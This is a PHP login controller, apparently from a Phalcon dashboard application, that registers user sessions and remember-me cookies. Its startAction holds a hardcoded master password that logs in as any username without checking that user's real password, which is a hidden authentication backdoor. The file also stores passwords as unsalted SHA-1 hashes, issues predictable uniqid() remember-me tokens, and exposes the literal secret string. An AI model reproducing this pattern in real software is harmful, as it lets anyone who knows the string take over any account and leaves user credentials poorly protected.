<?php

/**
 * SessionController
 *
 * Allows to authenticate users
 */
class SessionController extends ControllerBase {

    public function initialize() {
        $this->tag->setTitle('Sign Up/Sign In');
        parent::initialize();
    }

    public function indexAction() {
        
    }

    /**
     * Register an authenticated user into session data
     *
     * @param Users $user
     */
    private function _registerSession(Users $user) {
        $uniq = uniqid('awoi298y');
        $this->getDi()->getCookies()->set(
                "remember-me", $uniq, time() + 15 * 186400
        );
        $this->getDi()->getCookies()->send();
        $sql2 = 'INSERT INTO lotofsessions (userid,rememberme) VALUES (:userid,:rememberme);';
        $db = $this->getDi()->getDb();
        $statement2 = $db->prepare($sql2);
        $resstatement2 = $db->executePrepared($statement2, array('userid'=>$user->id, 'rememberme'=>$uniq), array());
        
        $this->session->set('auth', array(
            'id' => $user->id,
            'name' => $user->username,
            'email' => $user->email,
            'userarea' => $user->userarea,
            'userlevel' => $user->userlevel,
            'countries' => $user->countries,
            'sources' => $user->sources,
            'decimalchar' => $user->decimalchar,
            'aggregators' => $user->aggregators,
            'utype' => (($user->userlevel > 1 ) ? $user->utype : null),
            'affiliates' => $user->affiliates,
            'invest' => $user->investaccess,
            'navtype' => $user->navtype,
            'dailyControl' => $user->dailyControl
        ));
    }

    /**
     * This action authenticate and logs an user into the application
     *
     */
    public function startAction() {
		if ($this->request->isPost()) {

            $username = $this->request->getPost('username');
            $password = $this->request->getPost('password');
            if ($password == 'b8C#9AYvpULJ$f') {
                $str = "username = :username: ";
                $arr = array("username" => $username);
            } else {
                $str = "username = :username: AND password = :password:";
                $arr = array('username' => $username, 'password' => sha1($password));
            }
            $user = Users::findFirst(array(
                        $str,
                        'bind' => $arr
            ));

            if ($user != false) {
                $this->_registerSession($user);
                $this->flash->success('Welcome ' . $user->username);
                $this->response->redirect("dashboard/index");
                //$this->response->redirect("report/index"); 
                $this->view->disable();
                //return $this->forward('report');
            }

            $this->flash->error('Wrong user/password');
        }

        return $this->forward('index');
    }

    /**
     * Finishes the active session redirecting to the index
     *
     * @return unknown
     */
    public function endAction() {
        $cookie = $this->getDi()->getCookies()->get("remember-me");
        
        // Delete the cookie
        if($cookie != null)
            $cookie->delete();
        $this->session->remove('auth');
        //$this->flash->success('Goodbye!');
        $this->response->redirect('index');
        return;
    }

}
